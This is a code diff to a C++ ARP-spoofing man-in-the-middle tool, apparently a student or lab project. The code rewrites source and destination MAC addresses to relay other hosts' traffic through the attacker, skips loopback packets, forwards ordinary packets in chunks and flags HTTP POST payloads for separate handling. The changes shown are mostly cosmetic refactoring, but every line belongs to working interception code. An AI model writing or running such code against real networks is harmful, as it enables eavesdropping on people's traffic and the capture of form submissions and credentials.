@@ -1,4 +1,7 @@
-#include "mitm_attack.hpp"
+#include "arp.h"
+
+#include <arpa/inet.h>
+#include <netinet/tcp.h>
 
 /*
 Modify the source MAC address to the attacker to let the receiver think the packet is from the attacker
@@ -18,7 +21,8 @@ bool modifyPacket(uint8_t *buffer, std::map<std::vector<uint8_t>, std::vector<ui
 
     // If the destination IP is not in the map, change the destination MAC to the gateway's MAC
 
-    if (ip_mac_pairs.find({(uint8_t)(iph->daddr & 0xff), (uint8_t)((iph->daddr >> 8) & 0xff), (uint8_t)((iph->daddr >> 16) & 0xff), (uint8_t)((iph->daddr >> 24) & 0xff)}) == ip_mac_pairs.end()) {
+    std::vector<uint8_t> ip_daddr = {(uint8_t)(iph->daddr & 0xff), (uint8_t)((iph->daddr >> 8) & 0xff), (uint8_t)((iph->daddr >> 16) & 0xff), (uint8_t)((iph->daddr >> 24) & 0xff)};
+    if (ip_mac_pairs.find(ip_daddr) == ip_mac_pairs.end()) {
         // Find the MAC address for the gateway IP
         std::vector<uint8_t> gateway_ip_addr = {(uint8_t)(info.gateway_ip.sin_addr.s_addr & 0xff), (uint8_t)((info.gateway_ip.sin_addr.s_addr >> 8) & 0xff), (uint8_t)((info.gateway_ip.sin_addr.s_addr >> 16) & 0xff), (uint8_t)((info.gateway_ip.sin_addr.s_addr >> 24) & 0xff)};
         std::vector<uint8_t> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
@@ -43,7 +47,7 @@ void sendNonHttpPostPacket(uint8_t *buffer, int bytes, int sd, AccessInfo& info)
     uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
     int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));
 
-    int chunk_size = 1024;  // Size of each chunk
+    int chunk_size = 1500 - ETH_HDRLEN - sizeof(struct iphdr);  // Size of each chunk
     int total_sent = 0;     // Total amount of data sent
     while (total_sent < bytes) {
         int to_send = std::min(chunk_size, bytes - total_sent);
@@ -94,21 +98,21 @@ void receiveHandler(int sockfd, std::map<std::vector<uint8_t>, std::vector<uint8
             exit(EXIT_FAILURE);
         }
 
-        if (buffer[12] == ETH_P_ARP / 256 && buffer[13] == ETH_P_ARP % 256) {// Check if packet is an ARP packet
+        if ((buffer[12] == ETH_P_ARP / 256) && (buffer[13] == ETH_P_ARP % 256)) {// Check if packet is an ARP packet
             parseARPReply(buffer, ip_mac_pairs, info);
             continue;
         }
-        else if (n < ETH_HDRLEN + sizeof(struct iphdr)) continue; // Check if the packet is an IP packet
+        else if (n < (ETH_HDRLEN + sizeof(struct iphdr))) continue; // Check if the packet is an IP packet
         else {
             struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);  // Skip the Ethernet header
-            if (ntohl(iph->daddr) == 0x7f000001 || ntohl(iph->saddr) == 0x7f000001) continue; // If the ip is loopback, skip
+            if ((ntohl(iph->daddr) == 0x7f000001) || (ntohl(iph->saddr) == 0x7f000001)) continue; // If the ip is loopback, skip
         }
 
         // Modify the packet's MAC address
         modifyPacket(buffer, ip_mac_pairs, info);
 
         // Check if packet is a TCP packet
-        if (n < ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr)) {
+        if (n < (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr))) {
             if (sendto(sockfd, buffer, n, 0, (struct sockaddr *)&info.device, sizeof(info.device)) < 0) {
                 perror("sendto() failed (CHECK TCP PACKET)");
                 exit(EXIT_FAILURE);
@@ -123,7 +127,7 @@ void receiveHandler(int sockfd, std::map<std::vector<uint8_t>, std::vector<uint8
         // Check if the payload is an HTTP POST packet
         const char *http_post = "POST";
 
-        if (payload_length < strlen(http_post) || memcmp(payload, http_post, strlen(http_post)) != 0) {
+        if ((payload_length < strlen(http_post)) || (memcmp(payload, http_post, strlen(http_post)) != 0)) {
             sendNonHttpPostPacket(buffer, n, sockfd, info);
             continue;
         }
